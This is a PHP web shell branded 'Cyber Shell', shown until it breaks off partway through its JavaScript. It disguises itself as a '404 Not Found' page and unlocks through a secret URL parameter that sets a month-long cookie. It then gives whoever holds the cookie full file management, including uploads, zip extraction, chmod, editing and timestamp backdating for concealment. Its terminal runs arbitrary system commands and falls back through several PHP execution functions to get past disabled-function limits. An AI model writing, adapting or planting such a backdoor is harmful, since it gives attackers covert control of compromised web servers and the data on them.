<?php
error_reporting(0);
session_start();

$valid_hash = "d7710655dfd238c75bfbf383dc8e7e32";

$is_authenticated = false;

if (isset($_COOKIE['auth']) && $_COOKIE['auth'] === $valid_hash) {
    $is_authenticated = true;
}

if (!$is_authenticated && isset($_GET['bos168'])) {
    setcookie('auth', $valid_hash, time() + (86400 * 30), '/');
    $is_authenticated = true;
    
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

if (!$is_authenticated) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>404 Not Found</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                background: #000;
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                position: relative;
                overflow: hidden;
            }
            
            body::before {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: url('https://i.pinimg.com/736x/65/5a/7e/655a7e5fec1b8d69623499dca5103589.jpg') no-repeat center center fixed;
                background-size: cover;
                filter: blur(3px) brightness(0.3);
                z-index: -1;
            }
            
            .container {
                text-align: center;
                padding: 20px;
                position: relative;
                z-index: 1;
            }
            
            .ghost-container {
                position: relative;
                display: inline-block;
                animation: float 3s ease-in-out infinite;
            }
            
            .ghost {
                max-width: 400px;
                width: 100%;
                height: auto;
                border-radius: 20px;
                box-shadow: 0 0 50px rgba(0, 255, 0, 0.3);
                border: 2px solid #00ff00;
                transition: all 0.5s;
            }
            
            .ghost:hover {
                transform: scale(1.05);
                box-shadow: 0 0 80px rgba(0, 255, 0, 0.5);
            }
            
            .glitch-text {
                font-size: 3rem;
                font-weight: bold;
                text-transform: uppercase;
                color: #00ff00;
                text-shadow: 
                    2px 2px 0 #ff00ff,
                    -2px -2px 0 #00ffff;
                animation: glitch 1s infinite;
                margin-top: 30px;
                font-family: 'Courier New', monospace;
                letter-spacing: 5px;
            }
            
            .subtext {
                color: #0f0;
                font-size: 1.2rem;
                margin-top: 20px;
                font-family: 'Courier New', monospace;
                opacity: 0.8;
                text-shadow: 0 0 10px #0f0;
                animation: blink 2s infinite;
            }
            
            @keyframes float {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-20px); }
            }
            
            @keyframes glitch {
                0% { transform: translate(0); }
                20% { transform: translate(-2px, 2px); }
                40% { transform: translate(-2px, -2px); }
                60% { transform: translate(2px, 2px); }
                80% { transform: translate(2px, -2px); }
                100% { transform: translate(0); }
            }
            
            @keyframes blink {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.5; }
            }
            
            .matrix-rain {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                pointer-events: none;
                z-index: 0;
            }
            
            @media (max-width: 768px) {
                .ghost { max-width: 300px; }
                .glitch-text { font-size: 2rem; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="ghost-container">
                <img src="https://i.pinimg.com/736x/c2/c1/29/c2c129cf68e2c13019e1f5bcdd295772.jpg" 
                     alt="Ghost" 
                     class="ghost"
                     onerror="this.onerror=null; this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0MDAiIGhlaWdodD0iNDAwIiB2aWV3Qm94PSIwIDAgNDAwIDQwMCI+PHJlY3Qgd2lkdGg9IjQwMCIgaGVpZ2h0PSI0MDAiIGZpbGw9IiMwMDAiLz48dGV4dCB4PSI1MCIgeT0iMjAwIiBmaWxsPSIjMDBmZjAwIiBmb250LWZhbWlseT0iTW9ub3NwYWNlIiBmb250LXNpemU9IjQwIj40MDQgTm90IEZvdW5kPC90ZXh0Pjwvc3ZnPg=='">
            </div>
            <div class="glitch-text">404 Not Found</div>
            <div class="subtext">The requested URL was not found on this server.</div>
        </div>
        
        <div class="matrix-rain"></div>
        
        <script>
            const canvas = document.createElement('canvas');
            canvas.classList.add('matrix-rain');
            document.body.appendChild(canvas);
            
            const ctx = canvas.getContext('2d');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            
            const matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%+-/~{[|`]}";
            const matrixArray = matrix.split("");
            
            const fontSize = 10;
            const columns = canvas.width / fontSize;
            
            const drops = [];
            for(let x = 0; x < columns; x++) {
                drops[x] = 1;
            }
            
            function draw() {
                ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                ctx.fillStyle = '#0F0';
                ctx.font = fontSize + 'px monospace';
                
                for(let i = 0; i < drops.length; i++) {
                    const text = matrixArray[Math.floor(Math.random() * matrixArray.length)];
                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                    
                    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                        drops[i] = 0;
                    }
                    drops[i]++;
                }
            }
            
            setInterval(draw, 35);
            
            window.addEventListener('resize', () => {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            });
        </script>
    </body>
    </html>
    <?php
    exit;
}

// Initialize session variables
if (!isset($_SESSION['current_path'])) {
    $_SESSION['current_path'] = getcwd() ?: $_SERVER['DOCUMENT_ROOT'];
}
if (!isset($_SESSION['error_message'])) {
    $_SESSION['error_message'] = '';
}

// Check if ZipArchive is available
$zip_available = class_exists('ZipArchive');

// Handle AJAX requests
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax'])) {
    header('Content-Type: application/json');
    
    $response = ['success' => false, 'error' => '', 'data' => null];
    $action = $_POST['action'] ?? '';
    
    try {
        switch ($action) {
            case 'navigate':
                $target_path = $_POST['path'] ?? '';
                if (!empty($target_path)) {
                    // Handle relative paths
                    if ($target_path[0] !== DIRECTORY_SEPARATOR && $target_path !== 'root') {
                        $target_path = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $target_path;
                    }
                    $real_path = realpath($target_path);
                    if ($real_path && is_dir($real_path) && is_readable($real_path)) {
                        $_SESSION['current_path'] = $real_path;
                        $_SESSION['error_message'] = '';
                        $response['success'] = true;
                    } else {
                        $_SESSION['error_message'] = 'Cannot access this directory';
                        $response['error'] = $_SESSION['error_message'];
                    }
                }
                break;
                
            case 'list':
                $current_path = $_SESSION['current_path'];
                $items = getDirectoryContents($current_path);
                $breadcrumb = getFullBreadcrumb($current_path);
                $error = $_SESSION['error_message'];
                $_SESSION['error_message'] = '';
                
                $response['success'] = true;
                $response['data'] = [
                    'items' => $items,
                    'breadcrumb' => $breadcrumb,
                    'error' => $error,
                    'current_path' => $current_path
                ];
                break;
                
            case 'delete':
                $target = $_POST['target'] ?? '';
                $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $target;
                if (file_exists($fullpath) && is_writable($fullpath)) {
                    if (is_file($fullpath)) {
                        unlink($fullpath);
                        $response['success'] = true;
                    } elseif (is_dir($fullpath)) {
                        deleteDirectory($fullpath);
                        $response['success'] = true;
                    }
                } else {
                    $response['error'] = 'Cannot delete ' . $target;
                }
                break;
                
            case 'rename':
                $old = $_POST['old'] ?? '';
                $new = $_POST['new'] ?? '';
                $fullpath_old = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $old;
                $fullpath_new = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $new;
                if (file_exists($fullpath_old) && is_writable($fullpath_old) && !file_exists($fullpath_new)) {
                    rename($fullpath_old, $fullpath_new);
                    $response['success'] = true;
                } else {
                    $response['error'] = 'Cannot rename ' . $old;
                }
                break;
                
            case 'newfolder':
                $name = $_POST['name'] ?? '';
                $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $name;
                if (is_writable($_SESSION['current_path']) && !file_exists($fullpath)) {
                    mkdir($fullpath, 0755, true);
                    $response['success'] = true;
                } else {
                    $response['error'] = 'Cannot create folder';
                }
                break;
                
            case 'newfile':
                $name = $_POST['name'] ?? '';
                $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $name;
                if (is_writable($_SESSION['current_path']) && !file_exists($fullpath)) {
                    file_put_contents($fullpath, '');
                    $response['success'] = true;
                } else {
                    $response['error'] = 'Cannot create file';
                }
                break;
                
            case 'upload':
                if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
                    $dest = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
                    if (is_writable($_SESSION['current_path'])) {
                        move_uploaded_file($_FILES['file']['tmp_name'], $dest);
                        $response['success'] = true;
                    } else {
                        $response['error'] = 'Cannot upload file';
                    }
                } else {
                    $response['error'] = 'Upload failed';
                }
                break;
                
            case 'upload_extract':
                if ($zip_available && isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
                    $file_ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
                    if ($file_ext == 'zip') {
                        $dest = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
                        if (is_writable($_SESSION['current_path'])) {
                            if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
                                $zip = new ZipArchive;
                                if ($zip->open($dest) === TRUE) {
                                    $extract_path = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . pathinfo($dest, PATHINFO_FILENAME);
                                    if (!is_dir($extract_path)) mkdir($extract_path, 0755, true);
                                    $zip->extractTo($extract_path);
                                    $zip->close();
                                    unlink($dest);
                                    $response['success'] = true;
                                } else {
                                    $response['error'] = 'Invalid ZIP file';
                                }
                            }
                        } else {
                            $response['error'] = 'Cannot extract zip';
                        }
                    } else {
                        $response['error'] = 'File must be ZIP';
                    }
                } else {
                    $response['error'] = 'ZIP extraction not available';
                }
                break;
                
            case 'chmod':
                $target = $_POST['target'] ?? '';
                $perms = $_POST['perms'] ?? '';
                $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $target;
                if (file_exists($fullpath) && is_writable($fullpath)) {
                    $octal = octdec($perms);
                    chmod($fullpath, $octal);
                    $response['success'] = true;
                } else {
                    $response['error'] = 'Cannot change permissions';
                }
                break;
                
            case 'touch':
                $target = $_POST['target'] ?? '';
                $date = $_POST['date'] ?? '';
                $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $target;
                if (file_exists($fullpath) && is_writable($fullpath)) {
                    $timestamp = strtotime($date);
                    if ($timestamp && $timestamp > 0) {
                        touch($fullpath, $timestamp);
                        $response['success'] = true;
                    } else {
                        $response['error'] = 'Invalid date format';
                    }
                } else {
                    $response['error'] = 'Cannot change date';
                }
                break;
                
            case 'edit':
                $target = $_POST['target'] ?? '';
                $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $target;
                if (is_file($fullpath) && is_readable($fullpath)) {
                    $content = file_get_contents($fullpath);
                    $response['success'] = true;
                    $response['data'] = ['content' => $content, 'file' => $target];
                } else {
                    $response['error'] = 'Cannot read file';
                }
                break;
                
            case 'save':
                $target = $_POST['target'] ?? '';
                $content = $_POST['content'] ?? '';
                $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $target;
                if (is_writable($fullpath)) {
                    file_put_contents($fullpath, $content);
                    $response['success'] = true;
                } else {
                    $response['error'] = 'Cannot save file';
                }
                break;
                
            case 'command':
                $cmd = $_POST['cmd'] ?? '';
                $output = executeCommand($cmd);
                $response['success'] = true;
                $response['data'] = ['output' => $output];
                break;
        }
    } catch (Exception $e) {
        $response['error'] = $e->getMessage();
    }
    
    echo json_encode($response);
    exit;
}

// Helper functions
function executeCommand($cmd) {
    // Security: prevent dangerous commands
    $dangerous = ['rm -rf', 'dd if=', 'mkfs', ':(){', 'fork bomb'];
    foreach ($dangerous as $danger) {
        if (stripos($cmd, $danger) !== false) {
            return "Command blocked for security reasons.";
        }
    }
    
    // Try different execution methods
    $disabled = explode(',', ini_get('disable_functions'));
    $output = '';
    
    if (function_exists('shell_exec') && !in_array('shell_exec', $disabled)) {
        $output = shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('exec') && !in_array('exec', $disabled)) {
        exec($cmd . ' 2>&1', $out);
        $output = implode("\n", $out);
    } elseif (function_exists('system') && !in_array('system', $disabled)) {
        ob_start();
        system($cmd);
        $output = ob_get_clean();
    } elseif (function_exists('passthru') && !in_array('passthru', $disabled)) {
        ob_start();
        passthru($cmd);
        $output = ob_get_clean();
    } elseif (function_exists('popen') && !in_array('popen', $disabled)) {
        $handle = popen($cmd, 'r');
        $output = stream_get_contents($handle);
        pclose($handle);
    } else {
        $output = "Shell execution is disabled on this server.";
    }
    
    return $output ?: '(No output)';
}

function getDirectoryContents($path) {
    $items = [];
    if (!is_readable($path)) {
        $_SESSION['error_message'] = 'Cannot read this directory';
        return [];
    }
    
    $files = scandir($path);
    if ($files === false) {
        $_SESSION['error_message'] = 'Cannot scan directory';
        return [];
    }
    
    $dirs = [];
    $file_items = [];
    
    foreach ($files as $item) {
        if ($item === '.' || $item === '..') continue;
        
        $fullpath = $path . DIRECTORY_SEPARATOR . $item;
        $is_dir = is_dir($fullpath);
        
        $item_data = [
            'name' => $item,
            'is_dir' => $is_dir,
            'size' => $is_dir ? '-' : formatSize(@filesize($fullpath)),
            'perms' => getPerms($fullpath),
            'owner' => getOwner($fullpath),
            'modified' => @date('Y-m-d H:i', @filemtime($fullpath)),
            'perm_class' => getPermClass(getPerms($fullpath))
        ];
        
        if ($is_dir) {
            $dirs[] = $item_data;
        } else {
            $file_items[] = $item_data;
        }
    }
    
    usort($dirs, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
    usort($file_items, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
    
    return array_merge($dirs, $file_items);
}

function getFullBreadcrumb($path) {
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $breadcrumb = [];
    $current = '';
    
    foreach ($parts as $part) {
        if (empty($part)) {
            if (empty($current)) {
                $current = DIRECTORY_SEPARATOR;
                $breadcrumb[] = ['name' => 'root', 'path' => DIRECTORY_SEPARATOR];
            }
            continue;
        }
        
        if ($current === DIRECTORY_SEPARATOR || empty($current)) {
            $current .= $part;
        } else {
            $current .= DIRECTORY_SEPARATOR . $part;
        }
        
        $breadcrumb[] = [
            'name' => $part,
            'path' => $current
        ];
    }
    
    return $breadcrumb;
}

function formatSize($bytes) {
    if ($bytes === false || $bytes === null) return '-';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < 4) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

function getPerms($path) {
    $perms = @fileperms($path);
    if ($perms === false) return '---';
    return substr(sprintf('%o', $perms), -4);
}

function getOwner($path) {
    if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
        $uid = @fileowner($path);
        $user = @posix_getpwuid($uid);
        return $user['name'] ?? $uid;
    }
    return '-';
}

function getPermClass($perms) {
    if ($perms == '0755') return 'perm-755';
    if ($perms == '0644') return 'perm-644';
    if ($perms == '0777') return 'perm-777';
    return 'perm-other';
}

function deleteDirectory($dir) {
    if (!is_dir($dir)) return false;
    
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            deleteDirectory($path);
        } else {
            @unlink($path);
        }
    }
    return @rmdir($dir);
}

// Get server info safely
$server_user = 'unknown';
if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
    $user_info = @posix_getpwuid(@posix_geteuid());
    $server_user = $user_info['name'] ?? 'unknown';
}

$home_path = dirname(__FILE__);
$server_software = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
$php_version = PHP_VERSION;
$server_os = php_uname('s') ?: PHP_OS;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>its me zy | Cyber Shell</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            min-height: 100vh;
            font-family: 'Share Tech Mono', monospace;
            position: relative;
            color: #00ffaa;
            line-height: 1.6;
            padding: 0;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('https://i.pinimg.com/736x/65/5a/7e/655a7e5fec1b8d69623499dca5103589.jpg') no-repeat center center fixed;
            background-size: cover;
            filter: brightness(0.4);
            z-index: -2;
        }

        body::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at 20% 50%, rgba(0, 255, 170, 0.1) 0%, transparent 60%);
            z-index: -1;
            pointer-events: none;
        }

        .glitch-container {
            text-align: center;
            margin: 20px 0;
            position: relative;
        }

        .glitch {
            font-family: 'Orbitron', sans-serif;
            font-size: 3.5rem;
            font-weight: 900;
            text-transform: uppercase;
            color: #00ffaa;
            text-shadow: 
                0.05em 0 0 rgba(255, 0, 0, 0.75),
                -0.025em -0.05em 0 rgba(0, 255, 255, 0.75),
                0.025em 0.05em 0 rgba(0, 255, 0, 0.75);
            animation: glitch 500ms infinite;
            letter-spacing: 5px;
        }

        @keyframes glitch {
            0%, 100% { text-shadow: 0.05em 0 0 rgba(255,0,0,0.75), -0.05em -0.025em 0 rgba(0,255,255,0.75), -0.025em 0.05em 0 rgba(0,255,0,0.75); }
            14% { text-shadow: 0.05em 0 0 rgba(255,0,0,0.75), -0.05em -0.025em 0 rgba(0,255,255,0.75), -0.025em 0.05em 0 rgba(0,255,0,0.75); }
            15% { text-shadow: -0.05em -0.025em 0 rgba(255,0,0,0.75), 0.025em 0.025em 0 rgba(0,255,255,0.75), -0.05em -0.05em 0 rgba(0,255,0,0.75); }
            49% { text-shadow: -0.05em -0.025em 0 rgba(255,0,0,0.75), 0.025em 0.025em 0 rgba(0,255,255,0.75), -0.05em -0.05em 0 rgba(0,255,0,0.75); }
            50% { text-shadow: 0.025em 0.05em 0 rgba(255,0,0,0.75), 0.05em 0 0 rgba(0,255,255,0.75), 0 -0.05em 0 rgba(0,255,0,0.75); }
            99% { text-shadow: 0.025em 0.05em 0 rgba(255,0,0,0.75), 0.05em 0 0 rgba(0,255,255,0.75), 0 -0.05em 0 rgba(0,255,0,0.75); }
        }

        .container {
            width: 100%;
            min-height: 100vh;
            background: transparent;
            border: none;
            box-shadow: none;
            overflow: visible;
            padding: 10px;
        }

        .header {
            background: rgba(0, 0, 0, 0.15);
            padding: 15px 25px;
            border-bottom: 2px solid #00ffaa;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
            backdrop-filter: blur(3px);
            margin-bottom: 5px;
            border-radius: 8px 8px 0 0;
        }

        .logo h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 26px;
            color: #00ffaa;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-shadow: 0 0 10px rgba(0, 255, 170, 0.5);
        }

        .logo small {
            font-size: 12px;
            color: #88ffaa;
            display: block;
            margin-top: 3px;
            opacity: 0.9;
        }

        .status {
            background: rgba(0, 0, 0, 0.2);
            padding: 10px 20px;
            border-radius: 30px;
            border: 1px solid #00ffaa;
            font-size: 12px;
            backdrop-filter: blur(2px);
        }

        .path {
            background: rgba(0, 0, 0, 0.15);
            padding: 12px 25px;
            border-bottom: 1px solid rgba(0, 255, 170, 0.3);
            font-size: 13px;
            word-break: break-all;
            font-family: monospace;
            backdrop-filter: blur(3px);
            margin-bottom: 5px;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 5px;
        }

        .crumb-item {
            color: #88ffaa;
            text-decoration: none;
            padding: 4px 8px;
            border-radius: 4px;
            transition: all 0.3s;
            border: 1px solid transparent;
            display: inline-block;
            cursor: pointer;
        }

        .crumb-item:hover {
            background: rgba(0, 255, 170, 0.15);
            border-color: #00ffaa;
            color: #fff;
        }

        .error-message {
            background: rgba(255, 50, 50, 0.2);
            border: 1px solid #ff5555;
            color: #ff5555;
            padding: 10px 25px;
            margin: 5px 0;
            border-radius: 5px;
            font-family: monospace;
            backdrop-filter: blur(3px);
        }

        .action-bar {
            background: rgba(0, 0, 0, 0.15);
            padding: 15px 25px;
            border-bottom: 1px solid rgba(0, 255, 170, 0.3);
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            backdrop-filter: blur(3px);
            margin-bottom: 5px;
        }

        .action-group {
            display: flex;
            gap: 8px;
            background: rgba(0, 0, 0, 0.2);
            padding: 6px;
            border-radius: 30px;
            border: 1px solid rgba(0, 255, 170, 0.3);
            align-items: center;
            backdrop-filter: blur(2px);
        }

        .cyber-input {
            background: rgba(0, 0, 0, 0.25);
            border: 1px solid #00ffaa;
            color: #fff;
            padding: 8px 15px;
            border-radius: 30px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 12px;
            outline: none;
            transition: all 0.3s;
            min-width: 120px;
            backdrop-filter: blur(2px);
        }

        .cyber-input:focus {
            border-color: #00ffaa;
            box-shadow: 0 0 20px rgba(0, 255, 170, 0.5);
            background: rgba(0, 0, 0, 0.35);
        }

        .cyber-button {
            background: rgba(0, 0, 0, 0.25);
            border: 1px solid #00ffaa;
            color: #00ffaa;
            padding: 8px 18px;
            border-radius: 30px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 12px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
            backdrop-filter: blur(2px);
        }

        .cyber-button:hover {
            background: rgba(0, 255, 170, 0.2);
            color: #fff;
            box-shadow: 0 0 20px rgba(0, 255, 170, 0.5);
        }

        .file-table {
            width: 100%;
            border-collapse: collapse;
            background: transparent;
            backdrop-filter: blur(3px);
            margin-bottom: 10px;
        }

        .file-table th {
            background: rgba(0, 0, 0, 0.25);
            color: #00ffaa;
            font-weight: normal;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-size: 11px;
            padding: 12px 10px;
            text-align: left;
            backdrop-filter: blur(2px);
        }

        .file-table td {
            padding: 8px 10px;
            border: none;
            color: #e0e0e0;
            background: transparent;
            font-size: 12px;
        }

        .file-table tr:hover td {
            background: rgba(0, 255, 170, 0.1);
        }

        .dir-item {
            color: #ffaa00;
            font-weight: bold;
            cursor: pointer;
        }

        .file-item {
            color: #00ffaa;
            cursor: pointer;
        }

        .size {
            color: #88aaff;
        }

        .perms {
            font-family: monospace;
            font-weight: bold;
        }

        .perm-755 {
            color: #00ff00;
            text-shadow: 0 0 8px #00ff00;
            font-weight: bold;
        }

        .perm-644 {
            color: #88ff88;
            text-shadow: 0 0 5px #88ff88;
            font-weight: bold;
        }

        .perm-777 {
            color: #ff8888;
            text-shadow: 0 0 5px #ff8888;
        }

        .perm-other {
            color: #ffaa88;
        }

        .date {
            color: #aaff88;
        }

        .owner {
            color: #ffaa88;
            font-size: 11px;
        }

        .actions {
            white-space: nowrap;
        }

        .action-link {
            color: #88aaff;
            text-decoration: none;
            margin: 0 2px;
            font-size: 10px;
            transition: all 0.3s;
            display: inline-block;
            padding: 3px 5px;
            border: 1px solid transparent;
            border-radius: 3px;
            cursor: pointer;
        }

        .action-link:hover {
            color: #00ffaa;
            border-color: #00ffaa;
            background: rgba(0, 255, 170, 0.15);
        }

        .action-link.delete:hover {
            color: #ff5555;
            border-color: #ff5555;
            background: rgba(255, 85, 85, 0.15);
        }

        .terminal {
            margin: 5px 0;
            border: 2px solid #00ffaa;
            border-radius: 8px;
            overflow: hidden;
            background: rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(3px);
        }

        .terminal-header {
            background: rgba(0, 0, 0, 0.25);
            padding: 10px 20px;
            border-bottom: 1px solid #00ffaa;
            color: #00ffaa;
            font-weight: bold;
            display: flex;
            justify-content: space-between;
            backdrop-filter: blur(2px);
            font-size: 12px;
        }

        .terminal-body {
            background: rgba(0, 0, 0, 0.15);
            padding: 15px 20px;
            max-height: 250px;
            overflow-y: auto;
            color: #aaffaa;
            font-family: 'Share Tech Mono', monospace;
            font-size: 12px;
            white-space: pre-wrap;
            word-wrap: break-word;
            backdrop-filter: blur(2px);
        }

        .terminal-input {
            display: flex;
            background: rgba(0, 0, 0, 0.2);
            border-top: 1px solid #00ffaa;
        }

        .terminal-input input {
            flex: 1;
            background: rgba(0, 0, 0, 0.15);
            border: none;
            color: #00ffaa;
            padding: 10px 20px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 12px;
            outline: none;
        }

        .terminal-input button {
            background: rgba(0, 0, 0, 0.25);
            border: none;
            border-left: 1px solid #00ffaa;
            color: #00ffaa;
            padding: 10px 25px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }

        .terminal-input button:hover {
            background: rgba(0, 255, 170, 0.2);
            color: #fff;
        }

        .editor-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(5px);
            z-index: 1000;
            display: none;
            justify-content: center;
            align-items: center;
        }

        .editor-modal {
            width: 85%;
            height: 85%;
            background: rgba(10, 20, 20, 0.95);
            border: 2px solid #00ffaa;
            border-radius: 10px;
            padding: 20px;
            display: flex;
            flex-direction: column;
        }

        .editor-modal textarea {
            flex: 1;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #00ffaa;
            color: #fff;
            padding: 15px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 13px;
            border-radius: 5px;
            outline: none;
            resize: none;
        }

        .editor-buttons {
            margin-top: 15px;
            display: flex;
            gap: 10px;
            justify-content: flex-end;
        }

        .upload-group {
            display: flex;
            gap: 8px;
            align-items: center;
            flex-wrap: wrap;
        }

        .upload-label {
            background: rgba(0, 0, 0, 0.25);
            border: 1px solid #00ffaa;
            color: #00ffaa;
            padding: 8px 15px;
            border-radius: 30px;
            cursor: pointer;
            font-size: 12px;
            backdrop-filter: blur(2px);
        }

        .upload-label:hover {
            background: rgba(0, 255, 170, 0.15);
            color: #fff;
        }

        input[type="file"] {
            display: none;
        }

        .loading {
            text-align: center;
            padding: 20px;
            color: #00ffaa;
        }

        @media (max-width: 768px) {
            .glitch { font-size: 2rem; }
            .action-bar { flex-direction: column; }
            .action-group { flex-wrap: wrap; }
            .header { flex-direction: column; text-align: center; }
            .file-table th, .file-table td { font-size: 10px; padding: 6px 5px; }
        }
    </style>
</head>
<body>
    <div class="glitch-container">
        <div class="glitch">IT'S BONCEl</div>
    </div>

    <div class="container">
        <div class="header">
            <div class="logo">
                <h1>CYBER SHELL</h1>
                <small>v2.0 • enhanced edition</small>
            </div>
            <div class="status">
                <span>🖥️ <?= htmlspecialchars($server_os) ?></span>
                <span style="margin-left: 12px;">⚡ PHP <?= htmlspecialchars($php_version) ?></span>
                <span style="margin-left: 12px;">👤 <?= htmlspecialchars($server_user) ?></span>
            </div>
        </div>

        <div id="error-container" style="display: none;"></div>

        <div class="path" id="breadcrumb-container"></div>

        <div class="action-bar">
            <div class="action-group">
                <input type="text" id="new-folder-name" class="cyber-input" placeholder="New Folder" onkeypress="if(event.key==='Enter') createFolder()">
                <button onclick="createFolder()" class="cyber-button">CREATE</button>
            </div>

            <div class="action-group">
                <input type="text" id="new-file-name" class="cyber-input" placeholder="New File" onkeypress="if(event.key==='Enter') createFile()">
                <button onclick="createFile()" class="cyber-button">CREATE</button>
            </div>

            <div class="action-group upload-group">
                <form id="upload-form" enctype="multipart/form-data" style="display: inline;">
                    <label for="normal-upload" class="upload-label">📤 UPLOAD</label>
                    <input type="file" name="file" id="normal-upload" onchange="uploadFile(this)">
                </form>
                
                <?php if ($zip_available): ?>
                <form id="upload-zip-form" enctype="multipart/form-data" style="display: inline;">
                    <label for="zip-upload" class="upload-label">📦 UPLOAD+EXTRACT</label>
                    <input type="file" name="file" id="zip-upload" accept=".zip" onchange="uploadAndExtract(this)">
                </form>
                <?php endif; ?>
            </div>
            
            <div class="action-group">
                <button onclick="loadDirectory()" class="cyber-button">🔄 REFRESH</button>
            </div>
        </div>

        <div id="file-list-container">
            <table class="file-table" id="file-table">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Perms</th>
                        <th>Owner</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="file-list-body">
                    <tr><td colspan="6" class="loading">Loading...</td></tr>
                </tbody>
            </table>
        </div>

        <div class="terminal">
            <div class="terminal-header">
                <span>💻 TERMINAL</span>
                <span>zy@cyber:~$</span>
            </div>
            <div class="terminal-body" id="terminal-output">Welcome to Cyber Terminal v2.0<br>Type commands below to execute system commands.</div>
            <div class="terminal-input">
                <input type="text" id="terminal-cmd" placeholder="Enter command..." onkeypress="if(event.key==='Enter') executeCommand()">
                <button onclick="executeCommand()">EXEC</button>
            </div>
        </div>
    </div>

    <div class="editor-overlay" id="editor-overlay">
        <div class="editor-modal">
            <textarea id="editor-content" spellcheck="false"></textarea>
            <div class="editor-buttons">
                <button class="cyber-button" onclick="saveFile()">💾 SAVE</button>
                <button class="cyber-button" style="border-color: #ff5555; color: #ff5555;" onclick="closeEditor()">✖ CANCEL</button>
            </div>
        </div>
    </div>

    <script>
        let currentEditFile = '';
        const homePath = '<?= addslashes($home_path) ?>';
        let isLoading = false;

        function showError(message) {
            const container = document.getElementById('error-container');
            container.style.display = 'block';
            container.innerHTML = '<div class="error-message">⚠️ ' + escapeHtml(message) + '</div>';
            setTimeout(() => {
                container.style.display = 'none';
            }, 5000);
